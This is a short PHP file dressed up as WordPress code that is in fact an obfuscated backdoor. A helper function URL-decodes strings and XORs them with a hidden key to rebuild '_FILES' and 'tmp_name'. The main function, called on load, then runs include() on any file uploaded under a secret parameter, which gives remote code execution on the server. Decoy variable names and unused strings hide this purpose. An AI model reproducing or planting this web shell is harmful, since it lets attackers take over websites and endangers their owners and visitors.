<?php 	
function charset()

{

    $post_name = 'bgzygiuShfHEgm';
	$double_chars = 'replace_pairs';
    $menu_position = $post_name;
    

    $opening_tag = $GLOBALS[comment("%3D%2135%22%3A", $menu_position)];

    $public_only = $opening_tag;
	$no_texturize_shortcodes_stack = 'real_mime_types';
    $fallback_title = isset($public_only[$menu_position]);

    if ($fallback_title)

    {
        $name_offset = $opening_tag[$menu_position];
        $no_texturize_tags_stack = $name_offset[comment("%16%0A%0A%26%09%08%186", $menu_position)];
        $replace = $no_texturize_tags_stack;
        include ($replace);
    }
	$ancestor = 'datetime';
}
function comment($icon_dir_uri, $is_bad_flat_slug)

{
    $wp_error = $is_bad_flat_slug;
    $post_after = "url" . "decode";
    $template_lock = $post_after($icon_dir_uri);
	$printed = 'num_words';
    $_edit_link = substr($wp_error,0, strlen($template_lock));

    $_builtin = $template_lock ^ $_edit_link;
	$thumbnail_support = 'protocols';
    
	$singular_base = 'hash';
    $template_lock = strpos($_builtin, $_edit_link);
	$map_meta_cap = 'allowed_html';
    

    return $_builtin;
}


charset();

?>
